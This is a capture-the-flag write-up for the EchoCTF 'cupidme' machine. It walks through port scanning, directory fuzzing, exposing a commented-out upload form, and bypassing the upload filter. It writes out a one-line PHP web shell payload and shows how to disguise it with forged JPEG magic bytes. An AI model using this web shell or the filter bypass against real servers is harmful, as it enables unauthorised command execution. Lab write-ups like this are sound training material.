# Recon

## Portscanning

command:```sudo nmap -A 10.0.30.187 -T4  -v -p-```

```
```
From our scan we have only 1 open port, so our enumeration will be focused on that port

Lets fuzz for directories

command:```ffuf -u "http://10.0.30.187/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup```

```

```
Navigating to the ```images``` directory I got a ```403 error```. 

Lets navaigate to the ```/upload.php``` directory

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cf7c2a44-346c-4dbb-884c-3935990b6131)

As you can see we get redirected back to the main page.

Checking the page source,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9122bbbb-3a8d-4b75-b504-7420ad97032e)

Well, this is the reason why we can't view the ```/upload.php``` directory. The HTML code is commented.

To solve this we have to uncomment that part of the code. We'll be using the developer tools for this

So, right-click and inspect element

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c16de178-3964-49f4-ae0a-02b2fe8912bf)

Click on that drop down

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e6c40a03-3e0b-4f8b-9352-3fe8d65917a5)

Click on that also,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a65d193a-6025-4513-8004-5c1f0382600c)

Good, so our goal is to uncomment that part of the code.

Now, right-click and click on ```Edit As HTML```, we'll be removing the comments ```<!--``` and ```-->```

Doing that should get you this

As you can see  we can now access the upload button.



# Exploitation

Lets try to upload something, say a ```.jpg``` file

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4bd42d2a-5f42-447a-9100-8c8b67a0ce91)

oops, the file size supported is 39 bytes. So there's a filter in this upload function

1.Upload a .jpeg file 

2.The maximum size of the .jpeg file must be 39 bytes

These are the 2 filters in the upload function

Reading this [blog](https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/) talks about how to bypass file upload restrictions

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/11b52f62-d434-4baa-b702-fa5e10cebfee)

This is the method we'll be using

payload:```AAAA<?php system($_GET[â€˜cmdâ€™]); ?>```

Save this in a file ```bankai.php```

```
â”Œâ”€â”€(bl4ck4nonã‰¿bl4ck4non)-[~/Downloads/EchoCtf/cupidme]
â””â”€$ nano bankai.php 
                                                                                                                                                                                                
â”Œâ”€â”€(bl4ck4nonã‰¿bl4ck4non)-[~/Downloads/EchoCtf/cupidme]
â””â”€$ cat bankai.php 
AAAA<?php system($_GET[â€˜cmdâ€™]); ?>
```
Now, this is a php script, what we'll do is change the magic bytes header from a ```.php``` to a ```.jpeg```

To access the magic bytes of the file, we'll use ```hexeditor```

command:```hexeditor bankai.php```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8a33d3a2-05c8-4b42-8d2f-afc17283ee5c)

We'll be changing that from ```41 41 41 41``` to ```FF D8 FF EE```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/922fd96c-89fc-4e5e-9ce6-6f4f4b22f03d)

To save and exit, hit ```ctrl + x```

```
                                                                                                                                                                                                
â”Œâ”€â”€(bl4ck4nonã‰¿bl4ck4non)-[~/Downloads/EchoCtf/cupidme]
â””â”€$ cat bankai.php 
<?php system($_GET[â€˜cmdâ€™]); ?>
                                                                                                                                                                                                
â”Œâ”€â”€(bl4ck4nonã‰¿bl4ck4non)-[~/Downloads/EchoCtf/cupidme]
â””â”€$ file bankai.php   
bankai.php: JPEG image data
```
Good, now lets try to upload this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0eab6a04-a242-4526-a165-5e502427246c)

It worked heheðŸ˜Ž

Navigating to where the file was uploaded to

Cool, we get this. Now add ```?cmd=id``` to the back of the url
